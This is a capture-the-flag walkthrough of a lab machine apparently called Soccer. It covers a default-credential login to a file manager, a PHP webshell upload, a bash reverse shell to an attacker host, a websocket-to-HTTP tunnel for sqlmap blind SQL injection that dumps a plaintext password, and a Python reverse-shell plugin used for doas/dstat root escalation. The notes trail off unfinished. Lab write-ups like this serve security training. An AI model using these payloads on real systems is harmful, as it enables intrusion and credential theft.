### Host: 10.10.11.194

### Content

- Web enumeration
- Default credentials usage
- Unrestricted File Upload leading to RCE via Tiny CMS
- PHP Web Shell
- WebSocket Exploitation 

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvv -oG allPorts 10.10.11.194
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.194 ()   Status: Up
Host: 10.10.11.194 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9091/open/tcp//xmltec-xmlmail///
```

Services and Versions running:
```bash
nmap -p80,22,9091 -sCV -Pn -n -vvv -oN targeted 10.10.11.194
Nmap scan report for 10.10.11.194
Host is up, received user-set (0.078s latency).
Scanned at 2023-01-26 10:36:30 EST for 19s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 5797565def793c2fcbdb35fff17c615c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9091/tcp open  xmltec-xmlmail? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 26 Jan 2023 15:36:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 26 Jan 2023 15:36:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Only three ports are open, tcp-22 is not likely vulnerable since it's one of the latest version. After adding the entry "soccer.htb" and enumerating the website, we found nothing interesting, just a plain simple website:
![[Pasted image 20230126095929.png]]
Enumerating a little bit we identify the following directory with dirsearch:
```bash
dirsearch.py -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

301   178B   http://soccer.htb:80/tiny    -> REDIRECTS TO: http://soccer.htb/tiny/
```
This is a File Manager:
![[Pasted image 20230126095355.png]]
By searching for default credentials we identify the following:
![[Pasted image 20230126095624.png]]
After using them we get access to the File Manager:
![[Pasted image 20230126095751.png]]
As we can see at first glance, this are the files are the ones from the http://soccer.htb site, so our first idea is to upload a PHP reverse shell:
![[Pasted image 20230126100232.png]]
Unfortunately it is not possible to upload any file on the ROOT (/) directory, so after a tiny little enumeration we identify that /var/www/html/uploads has the right permissions so we upload a simple webshell:
![[Pasted image 20230126100521.png]]
### Exploitation
If we try to do a reverse shell directly from the PHP webshell we'll get some errors since the payload has the "&" special char which is translated as a parameter by the browser, we can send it to burpsuite in order to URL encode it.
Payload:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1'
```
![[Pasted image 20230126101047.png]]

### User Privilege Escalation
We gain access as www-data user, after some enumeration we identified some interesting entries on the /etc/hosts file:
```bash
www-data@soccer:~/html/tiny/uploads$ cat /etc/hosts
cat /etc/hosts
127.0.0.1  localhost soccer  soccer.htb soc-player.soccer.htb
127.0.1.1       ubuntu-focal    ubuntu-focal
```
Also we identify that there is another user called "player" so we need to escalate privileges into it first, by adding the entry "soc-player.soccer.htb" into the /etc/hosts file we are able to access to the following site:
![[Pasted image 20230126102306.png]]
As it has a Signup feature we can abuse it to access to the site:
![[Pasted image 20230126102411.png]]
By enumerating the site we found the following line on the source code:
```bash
<script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
```
There is a websocket running on port 9091, after researching some possible intrusion we get the following interesting resources:
* [STEWS](https://github.com/PalindromeLabs/STEWS) Scanner of websocket most common vulnerabilities.
* [Websocket](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/cross-site-websocket-hijacking-cswsh.md) Hacktricks web page to test some websocket vulnerabilities
* [SQLi on WebSocket](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) Paper to test SQLi on Websocket by tunneling the WS protocol to a TCP
This last resource is the one that we'll use to generate a socket on TCP redirecting our input to the listening websocket port with the following script: ^5721cc
```bash
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```
It is worth mention that we need to modify the following lines according to the websocket:
```bash
ws_server = "ws://soc-player.soccer.htb:9091"
data = '{"id":"%s"}' % message
```
In order to check the data parameter we can capture a web socket interaction in BurpSuite.
![[Pasted image 20230126112127.png]]
With this script running we can capture the traffic to the localhost and then exploit it with sqlmap:
```bash
sqlmap -r request --dbs   
        ___
       __H__                                                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.7#stable}                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=82404 AND (SELECT 6364 FROM (SELECT(SLEEP(5)))HJXH)
---
[12:35:47] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[12:35:47] [INFO] fetching database names
[12:35:47] [INFO] fetching number of databases
[12:35:47] [INFO] resumed: 5
[12:35:47] [INFO] resumed: mysql
[12:35:47] [INFO] resumed: information_schema
[12:35:47] [INFO] resumed: performance_schema
[12:35:47] [INFO] resumed: sys
[12:35:47] [INFO] resumed: soccer_db
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```
Then we can extract the password of player user:
```bash
sqlmap -r request -D soccer_db -T accounts --dump 
        ___
       __H__                                                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.7#stable}                                                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              
[12:37:42] [INFO] parsing HTTP request from 'request'
[12:37:42] [INFO] resuming back-end DBMS 'mysql' 
[12:37:42] [INFO] testing connection to the target URL
[12:37:42] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.10.9')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=82404 AND (SELECT 6364 FROM (SELECT(SLEEP(5)))HJXH)
---
[12:37:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[12:37:42] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[12:37:42] [INFO] resumed: 4
[12:37:42] [INFO] resumed: id
[12:37:42] [INFO] resumed: email
[12:37:42] [INFO] resumed: username
[12:37:42] [INFO] resumed: password
[12:37:42] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[12:37:42] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[12:37:42] [INFO] resumed: 1
[12:37:42] [INFO] resumed: player@player.htb
[12:37:42] [INFO] resumed: 1324
[12:37:42] [INFO] resumed: PlayerOftheMatch2022
[12:37:42] [INFO] resumed: player
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

### Privilege Escalation
By running linpeas.sh we identify the following:
```bash
Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                         
  Group player:                                                                                                                                                                           
/usr/local/share/dstat
```
Also the following SUID files were identified:
```bash
player@soccer:/usr/local/share/dstat$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
```
Binary /usr/local/bin/doas seems suspicious, by getting the man file of it we receive:
```bash
DOAS(1)                                                                      BSD General Commands Manual                                                                      DOAS(1)
NAME
doas — execute commands as another user
SYNOPSIS
     doas [-nSs] [-a style] [-C config] [-u user] [--] command [args]
```
By searching its configuration file:
```bash
player@soccer:/usr/local/share/dstat$ find / -name "doas.*" 2>/dev/null
/usr/local/share/man/man5/doas.conf.5
/usr/local/share/man/man1/doas.1
/usr/local/etc/doas.conf
```
This file contains the following:
player@soccer:/usr/local/share/dstat$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat


```bash
#! /usr/bin/python3

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.6",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
### Post Exploitation

### Credentials
```bash
player:PlayerOftheMatch2022
```

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some

### References



